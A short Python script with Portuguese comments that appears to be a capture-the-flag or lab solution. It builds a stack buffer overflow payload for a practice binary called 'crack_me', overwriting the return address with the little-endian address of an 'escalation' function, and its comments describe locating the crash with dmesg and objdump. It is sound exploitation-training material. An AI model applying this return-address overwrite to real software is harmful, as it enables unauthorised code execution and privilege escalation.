import sys

#Bytes necessarios para o exploit
print("A"* 64)
#Escrever caracters arbitrarios para o crash EX:BBBBCCCCDDDDEEEE)
#Use dmesg | tail-n 2 para adquirir o PI(ponteiro de instrução)

#Use sudo dmesg | tail-n 2 for PI, depois do crash
#Traduza o PI com bytes.fromhex("valueOfPI") do  python
#Use objdump -d ./crack_me | less para mostrar as funções do programa

#Endereço para a função "escalation": 080491a2
payload = b"AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAABBBBCCCCDDDD"
payload += b"\x08\x04\x91\xa2"[:: -1]#Little endian

sys.stdout.buffer.write(payload)

#python ./solution.py |  ./crack_me   -> não funciona, fecha buffer do aqruivo
#(python ./solution.py; cat) |  ./crack_me 